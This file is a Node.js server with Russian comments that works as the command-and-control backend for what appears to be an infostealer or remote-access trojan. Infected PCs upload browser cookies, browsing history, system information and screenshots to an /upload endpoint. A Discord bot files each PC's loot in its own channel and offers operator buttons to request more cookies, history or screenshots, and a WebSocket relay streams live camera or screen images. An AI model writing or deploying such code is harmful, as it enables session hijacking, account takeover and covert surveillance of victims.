// server.js
import express from "express";
import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } from "discord.js";
import { WebSocketServer } from "ws";
import http from "http";
import { fileURLToPath } from "url";
import { dirname, join } from "path";
import crypto from "crypto";

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
app.use(express.json({ limit: "50mb" }));

// ---------- Конфиг ----------
const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const CATEGORY_NAME = "Все ПК";
const ONLINE_TIMEOUT = 3 * 60 * 1000; // 3 минуты

// ---------- Состояние ----------
const onlinePCs = {};          // pcId -> timestamp последнего пинга
const pendingCommands = {};    // pcId -> array of commands
const channelByPC = {};        // pcId -> channelId
const wsCameraClients = {};    // pcId -> array of ws для live-камеры
const pcIdMap = {};            // shortId -> real pcId

// ---------- Утилита ----------
function makeShortId(pcId) {
    const shortId = crypto.createHash("sha1").update(pcId).digest("hex").slice(0, 10);
    pcIdMap[shortId] = pcId;
    return shortId;
}

function isPcOnline(pcId) {
    const lastPing = onlinePCs[pcId];
    return lastPing && (Date.now() - lastPing < ONLINE_TIMEOUT);
}

// ---------- Discord Bot ----------
const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
bot.once("ready", () => console.log(`✅ Бот вошёл как ${bot.user.tag}`));

// ---------- Кнопки ----------
function createControlButtons(pcId) {
    const shortId = makeShortId(pcId);
    return [new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`check_online|${shortId}`).setLabel("Чек онлайн").setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`get_cookies|${shortId}`).setLabel("Запросить куки").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_history|${shortId}`).setLabel("Запросить историю").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_system|${shortId}`).setLabel("Системная инфо").setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId(`get_screenshot|${shortId}`).setLabel("Скриншот").setStyle(ButtonStyle.Secondary)
    )];
}

async function sendControlButtons(pcId) {
    try {
        const guild = await bot.guilds.fetch(GUILD_ID);
        const category = await getOrCreateCategory(guild, CATEGORY_NAME);
        const channel = channelByPC[pcId] ? await guild.channels.fetch(channelByPC[pcId]).catch(()=>null) : null;
        const finalChannel = channel || await getOrCreateTextChannel(guild, pcId, category.id);
        channelByPC[pcId] = finalChannel.id;

        await finalChannel.send({
            content: `Управление ПК: ${pcId}`,
            components: createControlButtons(pcId)
        });
    } catch(err) {
        console.error("Ошибка отправки кнопок:", err);
    }
}

// ---------- Обработка кнопок ----------
bot.on("interactionCreate", async interaction => {
    if(!interaction.isButton()) return;
    const [command, shortId] = interaction.customId.split("|");
    const pcId = pcIdMap[shortId];
    if(!pcId) {
        await interaction.reply({ content: "❌ Неизвестный PC ID", ephemeral: true });
        return;
    }

    const replyOptions = { ephemeral: true };

    if(command === "check_online") {
        replyOptions.content = isPcOnline(pcId) ? `✅ ПК ${pcId} онлайн` : `❌ ПК ${pcId} оффлайн`;
        await interaction.reply(replyOptions);
        return;
    }

    if(!isPcOnline(pcId)){
        replyOptions.content = `❌ ПК ${pcId} оффлайн`;
        await interaction.reply(replyOptions);
        return;
    }

    if(!pendingCommands[pcId]) pendingCommands[pcId] = [];
    pendingCommands[pcId].push(command);
    replyOptions.content = `✅ Команда "${command}" отправлена ПК ${pcId}`;
    await interaction.reply(replyOptions);
});

// ---------- Категория и канал ----------
async function getOrCreateCategory(guild, name){
    const channels = await guild.channels.fetch();
    let category = channels.find(c => c.type === ChannelType.GuildCategory && c.name === name);
    if(!category) category = await guild.channels.create({ name, type: ChannelType.GuildCategory });
    return category;
}

async function getOrCreateTextChannel(guild, name, parentId){
    const channels = await guild.channels.fetch();
    let channel = channels.find(c => c.type === ChannelType.GuildText && c.name === name && c.parentId === parentId);
    if(!channel) channel = await guild.channels.create({ name, type: ChannelType.GuildText, parent: parentId });
    return channel;
}

// ---------- Приём данных ----------
app.post("/upload", async (req, res) => {
    try {
        const { pcId, cookies, history, systemInfo, screenshot } = req.body;
        if(!pcId) return res.status(400).json({ error:"pcId required" });

        const isNewPC = !onlinePCs[pcId];
        onlinePCs[pcId] = Date.now();

        const guild = await bot.guilds.fetch(GUILD_ID);
        const category = await getOrCreateCategory(guild, CATEGORY_NAME);
        const channel = channelByPC[pcId] ? await guild.channels.fetch(channelByPC[pcId]).catch(()=>null) : null;
        const finalChannel = channel || await getOrCreateTextChannel(guild, pcId, category.id);
        channelByPC[pcId] = finalChannel.id;

        const files = [];
        if(cookies) files.push({ attachment: Buffer.from(JSON.stringify(cookies, null, 2)), name: `${pcId}-cookies.json` });
        if(history) files.push({ attachment: Buffer.from(JSON.stringify(history, null, 2)), name: `${pcId}-history.json` });
        if(systemInfo) files.push({ attachment: Buffer.from(JSON.stringify(systemInfo, null, 2)), name: `${pcId}-system.json` });
        if(screenshot) files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${pcId}-screenshot.jpeg` });
        if(files.length) await finalChannel.send({ files });

        if(isNewPC) await sendControlButtons(pcId);

        if(screenshot && wsCameraClients[pcId]){
            wsCameraClients[pcId].forEach(ws => {
                try { ws.send(screenshot); } catch(e){ }
            });
        }

        res.json({ success:true });
    } catch(err){
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// ---------- Приём данных с камеры ----------
app.post("/upload-cam", async (req, res) => {
    try {
        const { pcId, screenshot } = req.body;
        if(!pcId || !screenshot) return res.status(400).json({ error:"pcId и screenshot required" });

        if(wsCameraClients[pcId]){
            wsCameraClients[pcId].forEach(ws => {
                try { ws.send(screenshot); } catch(e){ }
            });
        }

        res.json({ success:true });
    } catch(err){
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// ---------- Пинг ----------
app.post("/ping", (req,res)=>{
    const { pcId } = req.body;
    if(!pcId) return res.status(400).json({ error:"pcId required" });
    onlinePCs[pcId] = Date.now(); // обновляем последнее время пинга
    const commands = pendingCommands[pcId] || [];
    pendingCommands[pcId] = [];
    res.json({ commands });
});

// ---------- API фронта ----------
app.get("/api/online-pcs", (req,res)=>{
    const result = Object.keys(onlinePCs).filter(pcId => isPcOnline(pcId));
    res.json(result);
});

// ---------- Статика ----------
app.use(express.static(join(__dirname,"public")));

// ---------- WebSocket для live камеры ----------
const wss = new WebSocketServer({ noServer: true });
wss.on("connection", (ws, req)=>{
    const url = new URL(req.url, `http://${req.headers.host}`);
    const pcId = url.searchParams.get("pcId");
    if(!pcId) return ws.close();

    if(!wsCameraClients[pcId]) wsCameraClients[pcId] = [];
    wsCameraClients[pcId].push(ws);

    ws.on("close", () => {
        wsCameraClients[pcId] = wsCameraClients[pcId].filter(c=>c!==ws);
    });
});

// ---------- HTTP + WS ----------
const server = http.createServer(app);
server.on("upgrade", (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, ws => wss.emit("connection", ws, request));
});

// ---------- Запуск ----------
const PORT = process.env.PORT || 3000;
server.listen(PORT,()=>console.log(`🚀 Сервер слушает порт ${PORT}`));
bot.login(DISCORD_BOT_TOKEN);
